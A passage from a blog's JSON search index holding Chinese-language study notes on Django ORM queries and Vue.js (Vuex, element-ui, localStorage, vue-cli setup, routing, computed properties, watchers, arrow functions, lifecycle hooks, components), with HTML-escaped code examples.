values里可以传参数 values(&#x27;name&#x27;) 7.order_by() -&gt; 选择排序方式 order_by(&#x27;name&#x27;) 降序:- 8.aggregate() -&gt; aggregate(聚合函数) User.objects.all().aggregate(mm=Max(&#x27;age&#x27;)) --&gt; 字典[&#x27;mm&#x27;]--&gt;取值 查询queryset中的最大年龄 9.annotate() 分组 语法 User.objects.values().annotate() 以什么分组values里就写什么 eg: 以年龄分组 User.objects.values(&#x27;age&#x27;).annotate() eg: 以年龄分组,求每个年龄组中的最大年龄 User.objects.values(&#x27;age&#x27;).annotate(Max(&#x27;age&#x27;))","categories":[],"tags":[]},{"title":"","slug":"vue-day5","date":"2024-10-24T11:20:58.405Z","updated":"2024-10-07T05:21:29.156Z","comments":true,"path":"2024/10/24/vue-day5/","permalink":"http://example.com/2024/10/24/vue-day5/","excerpt":"","text":"vue-day51. Vuex Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。 1.1vuex简介 问题一: 传参的方法对于多层嵌套的组件将会非常繁琐，并且对于兄弟组件间的状态传递无能为力。对于问问问题二: 我们经常会采用父子组件直接引用或者通过事件来变更和同步状态的多份拷贝。以上的这些模式非常脆弱，通常会导致无法维护的代码。 1.2 vuex的使用 vuex在使用时主要关注两个属性: 分别是状态state与动作mutations。状态机在定义完成后还需要注册到vue的实例中取。 状态state: state是用来储存组件间所有想要共享的数据,不要把所有的数据都放入state.组件中的大部分数据都是组件本身使用,这些数据依旧放置在组件的data中. 动作mutations: 用来声明状态机可以接受的变化,本身是以个函数,所以可以在一个动作中取操作多个状态. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;script&gt; let first = &#123; template: ` &lt;div&gt; 这是一个组件 &lt;button @click=&quot;add&quot;&gt;点击数字增加&lt;/button&gt; &lt;/div&gt; `, methods: &#123; add() &#123; // 在函数中向状态机提交一个变化 动作 this.$store.commit(&quot;num_add&quot;); &#125;, &#125; &#125; let second = &#123; template: ` &lt;div&gt;这是第二个组件 &lt;span&gt;点击组件1的按钮,让组件2中的数字发生变化---&gt;&#123;&#123;$store.state.number&#125;&#125;&lt;/span&gt; &lt;/div&gt; ` &#125; // 创建状态机 初始化状态state以及行为mutations let myStore = new Vuex.Store(&#123; // 状态: 被共享的数据 state: &#123; // 需要共享的数据 number: 3, &#125;, // 状态机的动作, 所有组件提交的动作都可以在此被接受 mutations: &#123; // 接收组件1提交的动作 num_add: function (state) &#123; // 在动作中可以对共享的数据做限制 if (state.number &lt; 10) &#123; state.number++; &#125; &#125; &#125; &#125;) new Vue(&#123; el: &quot;#app&quot;, data: &#123;&#125;, components: &#123; first: first, second: second &#125;, // 需要将定义好的状态机注入到vue实例中 store: myStore, &#125;)&lt;/script&gt; 1234567# 总结1. 导入依赖2. 创建状态机 初始化state与mutations3. 将状态机注入到vue实例中4. 当从状态机中取值时, 需要使用$store.state.参数名 js中使用this.$store.state.参数名5. 动作是可以传递参数的, this.$store.comiit(&quot;动作名称&quot;, &quot;参数&quot;) 注意: 参数只能传递一个 但是可以将多个参数封装后进行传递 1.3 getters的使用 当状态机中state的数据发生改变时, 可以通过getters来对state中发生变化的数据做对应的操作 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;script&gt; let first = &#123; template: ` &lt;div&gt;这是第一个组件 &lt;button @click=&quot;add&quot;&gt;按钮&lt;/button&gt; &lt;/div&gt; `, methods: &#123; add() &#123; // 向状态机提交一个动作 this.$store.commit(&quot;add_count&quot;); &#125; &#125; &#125; let second = &#123; template: ` &lt;div&gt; &lt;span&gt;这是第二个组件-----&gt;&#123;&#123;$store.state.count&#125;&#125;&lt;/span&gt; &lt;br&gt; &lt;span&gt;获取count的相反数: &#123;&#123;$store.getters.change_count&#125;&#125;&lt;/span&gt;&lt;/div&gt; ` &#125; let myStore = new Vuex.Store(&#123; state: &#123; count: 1, &#125;, mutations: &#123; add_count: function (state) &#123; state.count++; &#125; &#125;, // getters与state的关系 类似于data computed getters: &#123; // 返回count的相反数 change_count(state) &#123; return 0 - state.count; &#125;, &#125; &#125;) new Vue(&#123; el: &quot;#app&quot;, data: &#123;&#125;, components: &#123; first: first, second: second, &#125;, store: myStore, &#125;)&lt;/script&gt; 2. 脚手架中使用vuex 脚手架中安装vuex: npm install vuex@3.0.1 在src目录下新建store&#x2F;index.js store&#x2F;idnex.js 123456789101112131415// 导包 vue vueximport Vue from &#x27;vue&#x27;import Vuex from &#x27;vuex&#x27;// 将vuex注入到vue实例中Vue.use(Vuex)// 将定义好的vuex导出export default new Vuex.Store(&#123; state: &#123;&#125;, mutations: &#123;&#125;, getters: &#123;&#125;,&#125;) src&#x2F;main.js 1234567891011121314151617181920// The Vue build version to load with the `import` command// (runtime-only or standalone) has been set in webpack.base.conf with an alias.import Vue from &#x27;vue&#x27;import App from &#x27;./App&#x27;import router from &#x27;./router&#x27;import store from &quot;./store&quot;Vue.config.productionTip = false/* eslint-disable no-new */new Vue(&#123; el: &#x27;#app&#x27;, router, components: &#123;App&#125;, template: &#x27;&lt;App/&gt;&#x27;, // 注入到vue实例中 store&#125;) 3. element-ui Element，一套为开发者、设计师和产品经理准备的基于 Vue 2.0 的桌面端组件库 官网: https://element.eleme.cn/#/zh-CN 2.1 环境安装 npm install element-ui 1234567......// 导入element-ui 以及样式import ElementUI from &#x27;element-ui&#x27;import &quot;element-ui/lib/theme-chalk/index.css&quot;// 全局注册Vue.use(ElementUI) 2.2 element-ui的使用123456&lt;el-button @click=&quot;add&quot;&gt;按钮&lt;/el-button&gt;&lt;el-button type=&quot;primary&quot; @click=&quot;add&quot; disabled&gt;按钮&lt;/el-button&gt;&lt;el-button type=&quot;success&quot; @click=&quot;add&quot;&gt;按钮&lt;/el-button&gt;&lt;el-button type=&quot;warning&quot; @click=&quot;add&quot; icon=&quot;el-icon-edit-outline&quot;&gt;修改&lt;/el-button&gt;&lt;el-button type=&quot;danger&quot; @click=&quot;add&quot; icon=&quot;el-icon-delete-solid&quot;&gt; 删除&lt;/el-button&gt;&lt;el-button type=&quot;info&quot; @click=&quot;add&quot;&gt;按钮&lt;/el-button&gt; 作业1231. 掌握vuex的使用2. 使用element-ui替换表格(可选)3. 整理的vue的知识点 知识图书","categories":[],"tags":[]},{"title":"","slug":"vue-day4","date":"2024-10-24T11:20:58.403Z","updated":"2024-10-07T05:21:29.225Z","comments":true,"path":"2024/10/24/vue-day4/","permalink":"http://example.com/2024/10/24/vue-day4/","excerpt":"","text":"vue-day41. localStorage与sessionStorage1.1 localStorage的使用123456789101112131415161718192021222324252627282930313233&lt;script&gt; // localStorage都是以key-value的形式将数据储存的 // localStorage储存的信息会直接以文本的形式保存到硬盘 不会随着页面刷新而 浏览器关闭的关系而消失 // localStorage中的数据必须用户主动删除才会消失 2-5m 数据 // localStorage.name = &quot;百知教育&quot;; // console.log(localStorage.name) // 删除数据 // localStorage.removeItem(&quot;name&quot;) // console.log(localStorage.name) // localStorage数据的储存方式 与访问方式 localStorage.age = 12; localStorage[&#x27;bir&#x27;] = &quot;2012-12-12&quot;; localStorage.setItem(&quot;pwd&quot;, &quot;123456&quot;); // console.log(localStorage.bir) // console.log(localStorage[&quot;age&quot;]) // let pwd = localStorage.getItem(&quot;pwd&quot;) // console.log(pwd) // 遍历数据 // for (let n = 0; n &lt; localStorage.length; n++) &#123; // console.log(&quot;第&quot; + n + &quot;条数据的key为&quot; + localStorage.key(n) + &quot;,value为&quot; + localStorage.getItem(localStorage.key(n))) // &#125; // 删除所有 localStorage.clear() // sessionStorage与localStorage在使用方式上完全一致&lt;/script&gt; 1.2 localStorage储存对象类型 localStorage只能以文本的形式将数据保存到浏览器, 所以储存对象类型的数据时需要进行序列化与反序列化 序列化: JSON.stringify(); 反序列化: JSON.parser() 1234567891011121314151617181920212223242526272829&lt;script&gt; let local = localStorage; local.number = 13; local.name = &quot;小黄&quot;; // console.log(typeof local.number) // console.log(typeof local.name) local.student = &#123; id: 1, username: &quot;武开沅&quot;, age: 18, &#125; console.log(typeof local.student) console.log(local.student) let student2 = &#123; id: 2, username: &quot;小黄&quot;, age: 55, &#125; // 储存对象类型的数据 需要将数据进行序列化 local.stu = JSON.stringify(student2); // 取出数据 将数据反序列化成对象 let stu2 = JSON.parse(local.stu); console.log(stu2.age)&lt;/script&gt; 2. vue-cli的开发2.1 安装脚手架123456789# 1. 安装脚手架 npm install -g vue-cli# 2. 卸载脚手架 npm uninstall -g vue-cli# 3. 查看脚手架版本 vue -V # 4. vue -V 如果不能被识别 需要配置系统环境变量path vue.cmd所在位置 D:\\node_space\\npm_global 2.2 创建脚手架项目 脚手架项目中一切皆组件, 组件是一个个的单独的文件 1234567# 1. 创建目录, 在此目录下创建项目 vue init webpack 项目名# 2. 切换到创建成功的项目的目录下 执行命令 每创建一个项目都需要执行一次 npm install # 3. 启动项目 使用webstorm或者pycharm打开启动 终端启动 npm start npm run dev 2.3 常见命令的解释1234561. npm install a. 如果后面有包名, npm install xxx 则按照给定的包名安装 b. 如果npm install 后面没有包名,则按照当前目录下的packag.json来安装依赖 c. -g代表全局安装 只能安装工具 不能安装依赖2. npm start npm run dev 所有使用npm构建的项目都可以使用npm start启动 等价于npm run dev","categories":[],"tags":[]},{"title":"","slug":"vue-day3","date":"2024-10-24T11:20:58.401Z","updated":"2024-10-07T05:21:29.288Z","comments":true,"path":"2024/10/24/vue-day3/","permalink":"http://example.com/2024/10/24/vue-day3/","excerpt":"","text":"vue-day31. vue路由 vue的页面是由多个组件组成的，一个vue项目只需要一张html页面，而页面中不同部分的展示其实就是通过vue的路由来切换不同的组件 1.1 路由的使用12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;div id=&quot;app&quot;&gt; &lt;h3&gt;这是主页的页头&lt;/h3&gt; &lt;hr&gt; &lt;!-- 定义路由访问不同组件的链接 通过to=&quot;/路由地址&quot;来指定当前标签要访问的组件 --&gt; &lt;router-link to=&quot;/first&quot;&gt;访问系统首页&lt;/router-link&gt; &lt;router-link to=&quot;/second&quot;&gt;访问用户页&lt;/router-link&gt; &lt;!--指定路由对应组件出现的位置--&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;!--依赖于vue.js才可以使用--&gt;&lt;script src=&quot;https://unpkg.com/vue-router/dist/vue-router.js&quot;&gt;&lt;/script&gt;&lt;script&gt; let first = &#123; template: ` &lt;div&gt;百知教育管理系统&lt;/div&gt; ` &#125; let second = &#123; template: ` &lt;div&gt;学生管理&lt;/div&gt; ` &#125; // 为每个组件准备对应的路由 定义组件与路由的映射关系 // 页面中输入路由来显示对应的组件 // 需要将定义好的路由注入到当前vue实例中 let myRouter = new VueRouter(&#123; routes: [ // path指的是访问组件的地址 component代表这个地址对应的组件 一一对应 &#123;path: &quot;/first&quot;, component: first&#125;, &#123;path: &quot;/second&quot;, component: second&#125; ] &#125;) new Vue(&#123; el: &quot;#app&quot;, data: &#123;&#125;, // 注入定义好的vue路由 // 通过router配置参数注入,从而整个vue实例都拥有路由功能 router: myRouter &#125;)&lt;/script&gt; 12345# 总结： 1. 需要为每个组件通过一一对应的方式来建立路由映射 new VueRouter 2. 需要将定义好的路由映射注入到vue的实例中 router: 变量名 3. 需要在指定的位置使用 router-view标签来选择组件展示的位置 4. 可以通过router-link来发起访问不同组件的路由 1.2 路由的应用12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;div id=&quot;app&quot;&gt; &lt;h2&gt;系统欢迎页&lt;/h2&gt; &lt;router-link to=&quot;/index&quot;&gt;首页&lt;/router-link&gt; &lt;router-link to=&quot;/user&quot;&gt;用户&lt;/router-link&gt; &lt;hr&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://unpkg.com/vue-router/dist/vue-router.js&quot;&gt;&lt;/script&gt;&lt;script&gt; let index = &#123; template: ` &lt;div&gt; &lt;h4&gt;这是index页面&lt;/h4&gt; &lt;h3&gt;欢迎访问信息管理系统&lt;/h3&gt;&lt;/div&gt; ` &#125; let user = &#123; template: ` &lt;div&gt; &lt;h3&gt;用户列表页&lt;/h3&gt; &lt;table border=&quot;2&quot;&gt; &lt;tr&gt; &lt;td&gt;ID&lt;/td&gt; &lt;td&gt;姓名&lt;/td&gt; &lt;td&gt;生日&lt;/td&gt; &lt;td&gt;操作&lt;/td&gt; &lt;/tr&gt; &lt;tr v-for=&quot;user in users&quot; :key=&quot;user.id&quot;&gt; &lt;td&gt;&#123;&#123; user.id &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123; user.username &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123; user.bir &#125;&#125;&lt;/td&gt; &lt;td&gt;删除 | 更新&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt; `, data() &#123; return &#123; users: [ &#123;&quot;id&quot;: 1, username: &quot;小黑&quot;, bir: &quot;2013-12-12&quot;&#125;, &#123;&quot;id&quot;: 2, username: &quot;小波&quot;, bir: &quot;2014-11-12&quot;&#125;, &#123;&quot;id&quot;: 3, username: &quot;小广&quot;, bir: &quot;2015-10-12&quot;&#125;, ] &#125; &#125;, &#125; let myRouter = new VueRouter(&#123; routes: [ &#123;path: &quot;/index&quot;, component: index&#125;, &#123;path: &quot;/user&quot;, component: user&#125;, // 当路由匹配到 / 将重定向到首页 &#123;path: &quot;/&quot;, redirect: &quot;/index&quot;&#125;, // 当用户的路由没有匹配到任何地址时 重定向到首页 要放到路由的末尾 &#123;path: &quot;/*&quot;, redirect: &quot;/index&quot;&#125; ] &#125;) new Vue(&#123; el: &quot;#app&quot;, data: &#123;&#125;, router: myRouter, &#125;)&lt;/script&gt; 2. 路由的参数传递 127.0.0.1:8000&#x2F;user&#x2F;get_user&#x2F;?id&#x3D;1 127.0.0.1:8000&#x2F;user&#x2F;get_user&#x2F;1&#x2F; 2.1 query拼接传参 在通过&lt;router-link to=&quot;路径地址&quot;&gt;发起访问请求时,可以在路径后通过?拼接的形式传递参数 拼接传参的形式需要在对应的组件内部通过&#123;&#123;$route.query.参数名&#125;&#125;取值 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;div id=&quot;app&quot;&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://unpkg.com/vue-router/dist/vue-router.js&quot;&gt;&lt;/script&gt;&lt;script&gt; let first = &#123; template: ` &lt;div&gt; 这是组件1 &lt;router-link to=&quot;/second?id=3&amp;name=tom&quot;&gt;查看组件2的这一页&lt;/router-link&gt;&lt;/div&gt; ` &#125; let second = &#123; template: ` &lt;div&gt;这是组件2: 需要接受组件1传递过来的id---&gt;: &#123;&#123; $route.query.id &#125;&#125; &lt;br&gt; 这是上个组件传递的用户名---&gt;: &#123;&#123;$route.query.name&#125;&#125; &lt;/div&gt; ` &#125; let myRouter = new VueRouter(&#123; routes: [ &#123;path: &quot;/first&quot;, component: first&#125;, &#123;path: &quot;/second&quot;, component: second&#125;, &#123;path: &quot;/&quot;, redirect: &quot;/first&quot;&#125;, ] &#125;) new Vue(&#123; el: &quot;#app&quot;, data: &#123;&#125;, router: myRouter, &#125;)&lt;/script&gt; 2.2 动态路由传参 所谓的动态路由传参,就是将参数作为路由的一部分传递 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;div id=&quot;app&quot;&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://unpkg.com/vue-router/dist/vue-router.js&quot;&gt;&lt;/script&gt;&lt;script&gt; let first = &#123; template: ` &lt;div&gt; 这是组件1 &lt;router-link to=&quot;/second/1/tom&quot;&gt;访问组件2&lt;/router-link&gt;&lt;/div&gt; ` &#125; let second = &#123; template: ` &lt;div&gt; 这是组件2: 接受组件1传递的id---&gt;: &#123;&#123;$route.params.id&#125;&#125; &lt;br&gt; 这是组件1传递的用户名---&gt; &#123;&#123;$route.params.name&#125;&#125;&lt;/div&gt; ` &#125; let myRouter = new VueRouter(&#123; routes: [ &#123;path: &quot;/first&quot;, component: first&#125;, &#123;path: &quot;/second/:id/:name&quot;, component: second&#125;, &#123;path: &quot;/&quot;, redirect: &quot;/first&quot;&#125;, ] &#125;) new Vue(&#123; el: &quot;#app&quot;, data: &#123;&#125;, router: myRouter, &#125;)&lt;/script&gt; 1234# 总结: 1. 动态路由传参需要将参数包含在路径中 2. 在定义路由时需要按位置匹配好参数 &lt;router-link to=&quot;/second/1/tom&quot;&gt; 需要与你的路由地址一一匹配 3. 参数需要使用&#123;&#123;$route.params.参数名接受&#125;&#125; 2.3 js跳转传参 通过拼接传参在接受的时候使用 &#123;&#123; $route.query.参数名&#125;&#125; 通过动态路由传参需要使用 &#123;&#123; $route.params.参数名&#125;&#125;接受 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;div id=&quot;app&quot;&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://unpkg.com/vue-router/dist/vue-router.js&quot;&gt;&lt;/script&gt;&lt;script&gt; let com = &#123; template: ` &lt;div&gt; 这是组件1 &lt;button @click=&quot;goPage&quot;&gt;跳转到用户页面&lt;/button&gt; &lt;/div&gt; `, methods: &#123; goPage() &#123; // 可以通过此方法跳转组件 // this.$router.push(&quot;/com2?id=4&quot;) // this.$router.push(&quot;/com2/1&quot;) this.$router.push(&#123;path: &quot;/com2/1&quot;&#125;); &#125; &#125; &#125; let com2 = &#123; template: ` &lt;div&gt;这组件2: 接受组件1传递的参数---&gt;&#123;&#123;$route.query.id&#125;&#125; &lt;div&gt;这组件2: 接受组件1动态路由参数---&gt;&#123;&#123;$route.params.id&#125;&#125;&lt;/div&gt; &lt;/div&gt; ` &#125; let myRouter = new VueRouter(&#123; routes: [ &#123;path: &quot;/com&quot;, component: com&#125;, &#123;path: &quot;/com2/:id&quot;, component: com2&#125;, &#123;path: &quot;/&quot;, redirect: &quot;/com&quot;&#125;, ] &#125;) new Vue(&#123; el: &quot;#app&quot;, data: &#123;&#125;, router: myRouter, &#125;)&lt;/script&gt; 2.4 route 与 router的区别 $route对象是当前路由的信息对象, 可以通过$route.query|$route.params来获取当前路径所包含的参数, 使用$route.path可以获取当前路由的路径 $router对象是控制整个路由系统的对象, 切换路径的操作都是由此对象完成的. router-link标签是一种快捷方式","categories":[],"tags":[]},{"title":"","slug":"vue-day2","date":"2024-10-24T11:20:58.399Z","updated":"2024-10-07T05:21:29.190Z","comments":true,"path":"2024/10/24/vue-day2/","permalink":"http://example.com/2024/10/24/vue-day2/","excerpt":"","text":"vue-day21. 计算属性与监听事件1.1 计算属性computed computed: 中声明的是方法属性, 不可与data的变量重复 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;div id=&quot;app&quot;&gt; &lt;!-- 多个变量的显示依赖于一个变量的变化 --&gt; &lt;p @click=&quot;low_num&quot;&gt;&#123;&#123;num&#125;&#125;&lt;/p&gt; &lt;p&gt;十位: &#123;&#123;parseInt(num / 10)&#125;&#125;&lt;/p&gt; &lt;p&gt;个位: &#123;&#123;num % 10&#125;&#125;&lt;/p&gt; &lt;hr&gt; &lt;!-- 一个变量的值依赖于多个变量 且依赖的任意一个变量发生改变,则该变量都会变化 --&gt; &lt;!-- &lt;input type=&quot;text&quot; v-model=&quot;shi&quot;&gt;--&gt; &lt;!-- &lt;input type=&quot;text&quot; v-model=&quot;ge&quot;&gt;--&gt; &lt;input type=&quot;number&quot; v-model=&quot;shi&quot; max=&quot;9&quot; min=&quot;0&quot;&gt; &lt;input type=&quot;number&quot; v-model=&quot;ge&quot; max=&quot;9&quot; min=&quot;0&quot;&gt; 结果: &lt;b&gt;&#123;&#123; shi * 10 + +ge &#125;&#125;&lt;/b&gt; 结果: &lt;b&gt;&#123;&#123;result&#125;&#125;&lt;/b&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; new Vue(&#123; el: &quot;#app&quot;, data: &#123; num: 34, shi: &quot;&quot;, ge: &quot;&quot;, // result: &quot;1&quot;, 不能与方法属性重名 &#125;, methods: &#123; low_num() &#123; this.num--; &#125;, &#125;, // 1. computed用来声明方法属性 // 2. 声明的方法属性不能在data中重复定义 // 3. 定义的方法属性必须在页面中渲染使用才生效 才会对内部的变量进行监听 computed: &#123; // 定义的方法属性 result() &#123; console.log(&quot;11111&quot;) return this.shi * 10 + +this.ge; &#125;, &#125; &#125;)&lt;/script&gt; 1234# 总结 // 1. computed用来声明方法属性 // 2. 声明的方法属性不能在data中重复定义 // 3. 定义的方法属性必须在页面中渲染使用才生效 才会对内部的变量进行监听 1.2 监听事件 当多个变量依赖于一个属性,则可以使用watch来监听这个属性的变化 12345678910111213141516171819202122232425262728293031323334&lt;div id=&quot;app&quot;&gt; &lt;p @click=&quot;clickMe&quot;&gt;&#123;&#123;num&#125;&#125;&lt;/p&gt; &lt;p&gt;十位: &#123;&#123;shi&#125;&#125;&lt;/p&gt; &lt;p&gt;个位: &#123;&#123;ge&#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; new Vue(&#123; el: &quot;#app&quot;, data: &#123; num: 99, shi: &quot;&quot;, ge: &quot;&quot;, &#125;, methods: &#123; clickMe() &#123; this.num -= 3; &#125;, &#125;, // 1. 监听属性监听的是data中已存在的变量的变化 // 2. 监听的值一旦发生改变,则就会触发监听事件 // 3. 监听事件不需要返回值 watch: &#123; // 代表监听的是data中的num变量 num() &#123; this.shi = parseInt(this.num / 10); this.ge = this.num % 10; &#125;, &#125;, &#125;)&lt;/script&gt; 1234# 总结 // 1. 监听属性监听的是data中已存在的变量的变化 // 2. 监听的值一旦发生改变,则就会触发监听事件 // 3. 监听事件不需要返回值 2. 箭头函数1.1 箭头函数写法 箭头函数就是对于匿名函数的简化 12345678910111213141516171819202122232425262728293031323334&lt;script&gt; // 正常函数 function add(a, b) &#123; console.log(a + b) &#125; // add(2, 6) // 匿名函数 let app = function (a, b, c) &#123; console.log(a + b * c) &#125; // app(4, 5, 6) // 箭头函数其实就是对于匿名函数写法的简化 // (参数列表) =&gt; 如果在函数体只有一条语句则可以省略&#123;&#125; let app2 = (a, b, c) =&gt; console.log(a + b + c) // app2(2, 5, 8) let app3 = function (a, b) &#123; console.log(a + b); console.log(a * b); &#125; app3(4, 5) let app4 = (a, b) =&gt; &#123; console.log(a + b); console.log(a * b); &#125; app4(5,6)&lt;/script&gt; 1.2 箭头函数 在回调函数中使用箭头函数不会改变原有的this指向 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;script&gt; let user = &#123; username: &quot;小黑&quot;, app: function () &#123; // 当前this指向的是当前的user实例 console.log(this.username) &#125; &#125; user.app() let student = &#123; username: &quot;小黄&quot;, app: function () &#123; // 在回调函数中this的指向会被改变 不再指向当前student实例 setTimeout(function () &#123; // 获取不到this对象了 已经被改变了 console.log(this.username) &#125;) &#125; &#125; student.app() let emp = &#123; username: &quot;小绿&quot;, // 回调函数中this指向会被改变 app: function () &#123; // 在回调函数中使用箭头函数不会改变this指向 setTimeout(() =&gt; &#123; console.log(this.username); &#125;) &#125; &#125; emp.app() new Vue(&#123; el: &quot;#app&quot;, data: &#123;&#125;, &#125;)&lt;/script&gt; 3. Vue的生命周期[重要]1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;div id=&quot;app&quot;&gt; &lt;span id=&quot;span&quot;&gt;文本&lt;/span&gt; &lt;h3 @click=&quot;change&quot; id=&quot;sp&quot;&gt;&#123;&#123;number&#125;&#125;&lt;/h3&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; // 在这一步创建了一个vue的实例 初始化 运行 销毁 // 初始化之前 数据赋值之前 数据赋值以后 new Vue(&#123; el: &quot;#app&quot;, data: &#123; number: 50, &#125;, methods: &#123; change() &#123; this.number--; &#125;, &#125;, // 1. vue的声明周期的第一个钩子 该钩子函数在执行时vue实例仅完成了自身事件的绑定以及生命周期初始化 // 此时vue实例中还没有 data el methods等属性 beforeCreate: function () &#123; console.log(&quot;beforeCreate: &quot; + this.number); &#125;, // 2. 第二个钩子 在这个函数执行时vue实例已经初始化了data属性 methods等相关方法 created: function () &#123; console.log(&quot;create: &quot; + this.number) &#125;, // 3. 该函数在执行时vue将el作为执行范围来进行模板编译 beforeMount() &#123; console.log(&quot;beforeMount: &quot; + document.getElementById(&quot;span&quot;).innerText); &#125;, // 4. 次函数在执行时已经将数据渲染到了页面并完成了页面数据的更新 mounted() &#123; console.log(&quot;mounted: &quot; + document.getElementById(&quot;span&quot;).innerText); &#125;, // 5. 该函数是在数据被修改时执行 这个执行仅仅是vue实例中数据变化但页面显示的依旧是原来的数据 beforeUpdate() &#123; console.log(&quot;beforeUpdate: &quot; + this.number) console.log(&quot;beforeUpdate: &quot; + document.getElementById(&quot;sp&quot;).innerText) &#125;, // 6. 该函数在执行时 vue实例中数据和页面中渲染的数据已经更新完成了 updated()&#123; console.log(&quot;updated: &quot; + this.number) console.log(&quot;updated: &quot; + document.getElementById(&quot;sp&quot;).innerText) &#125;, // 7. 该钩子函数在执行时 vue实例中的data和methods还没有被销毁 beforeDestroy()&#123; &#125;, // 8. 次函数执行时 vue实例已经被销毁了 destroyed()&#123; &#125;, &#125;)&lt;/script&gt; 4. vue的组件[重要] 组件的作用: 用来减少vue实例中的代码量,日后在开发过程中可以将一些重复的代码以组件的形式进行封装 4.1 组件的概念121. 组件: 一个组件就是html css js的独立的集合体, 可以完成前端页面的代码复用2. 组件可以分为根组件,全局组件,局部组件 4.2 全局组件 全局组件是将定义好的组件直接注册给vue实例, 以后在任意vue的范围内使用组件都可以生效 1234567891011121314151617181920212223242526272829&lt;div id=&quot;app&quot;&gt; &lt;com&gt;&lt;/com&gt; &lt;com&gt;&lt;/com&gt; &lt;com&gt;&lt;/com&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;!-- 组件的使用包括三部分: 组件的定义 组件的注册 组件的渲染 --&gt;&lt;script&gt; // 1. 组件的定义 组件就是一个普通的js对象 let com = &#123; // html页面 template: ` &lt;div&gt;这是我的第一个组件&lt;/div&gt; `, &#125; // 2. 组件的注册 全局注册 局部注册 // 全局组件的注册: Vue.component(&quot;组件注册后的名称&quot;, &quot;组件对象&quot;) Vue.component(&quot;com&quot;, com) new Vue(&#123; el: &quot;#app&quot;, data: &#123;&#125;, &#125;)&lt;/script&gt; 4.3 组件中data的使用 组件中的data是一个函数, 但是不能写成箭头函数 除了data的定义与vue实例中的data不同,二者在使用方面没有区别 组件中的data是相互隔离的,两者互不影响 1234567891011121314151617181920212223242526272829303132333435&lt;div id=&quot;app&quot;&gt; &lt;first&gt;&lt;/first&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; let first = &#123; template: ` &lt;div&gt; 这又是一个组件 &lt;br&gt; &lt;span @click=&quot;change&quot;&gt;这是组件的span, &#123;&#123;username&#125;&#125;&lt;/span&gt; &lt;/div&gt; `, // 组件中data对应的值的 函数 data: function () &#123; return &#123; username: &quot;小黑&quot;, &#125; &#125;, methods: &#123; change()&#123; alert() &#125; &#125; &#125; Vue.component(&quot;first&quot;, first) new Vue(&#123; el: &quot;#app&quot;, data: &#123;&#125;, &#125;)&lt;/script&gt; 4.4 局部组件 局部组件的定义以及使用方式与全局组件保持一致，只不过是注册方式不同。 且局部组件只在注册的vue实例中生效 1234567891011121314151617181920212223242526272829&lt;div id=&quot;app&quot;&gt; &lt;second&gt;&lt;/second&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; let second = &#123; template: ` &lt;div&gt;这是局部组件&lt;/div&gt; ` &#125; // 全局注册 // Vue.component(&quot;second&quot;, second) // 根组件 new Vue(&#123; el: &quot;#app&quot;, data: &#123;&#125;, // 将second注册给某个vue实例 // 局部组件只能在注册的vue的实例中使用 其他作用范围不能使用 components: &#123; &quot;second&quot;: second, &#125; &#125;)&lt;/script 4.5 props属性 组件中独有一个props属性，在vue实例中不存在 作用：用来给组件传递相应的静态或者动态数据 12345678910111213141516171819202122232425262728293031323334353637&lt;div id=&quot;app&quot;&gt; &lt;com css=&quot;red&quot; user=&quot;tom&quot;&gt;&lt;/com&gt; &lt;com css=&quot;green&quot; user=&quot;marry&quot;&gt;&lt;/com&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; // z组件中的template中只能有一个唯一的根标签,不能有同级的标签 // 组件的根标签可以不是div 不能有兄弟标签 let com = &#123; template: ` &lt;div&gt; &lt;div :class=&quot;css&quot;&gt;这还是我的组件&lt;/div&gt; &lt;/div&gt; `, // 可以在组件内接受组件标签传递过来的参数 从而使组件内部可以拥有动态的属性 // props可以理解为一个数组 里面是所有组件可以接收的参数,相当于参数名 // 可以将props理解为一个只读的data属性 props: [&quot;css&quot;, &quot;user&quot;], created: function () &#123; console.log(this.user) &#125; &#125; new Vue(&#123; el: &quot;#app&quot;, data: &#123;&#125;, components: &#123; &quot;com&quot;: com, &#125;, &#125;)&lt;/script&gt; 5. 